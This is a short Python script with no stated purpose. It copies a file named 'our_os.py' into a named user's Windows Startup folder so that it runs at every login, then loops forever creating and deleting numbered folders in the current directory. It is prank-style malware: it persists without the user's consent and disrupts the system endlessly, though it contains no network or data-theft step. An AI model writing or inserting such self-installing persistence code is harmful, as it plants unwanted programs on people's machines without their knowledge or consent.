import os
import time

my_path = r'C:\Users\noyon\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\program.py'
if os.path.exists(my_path):
    pass
else:
    data = ''
    with open('our_os.py', 'r') as fr:
        data = fr.read()
    with open(my_path, 'w') as fw:
        fw.write(data)

while True:
    for i in range(1, 21):
        if os.path.exists(str(i)):
            pass
        else:
            os.mkdir(str(i))
            time.sleep(2)

    for i in range(1, 21):
        if os.path.exists(str(i)):
            os.rmdir(str(i))
            time.sleep(2)










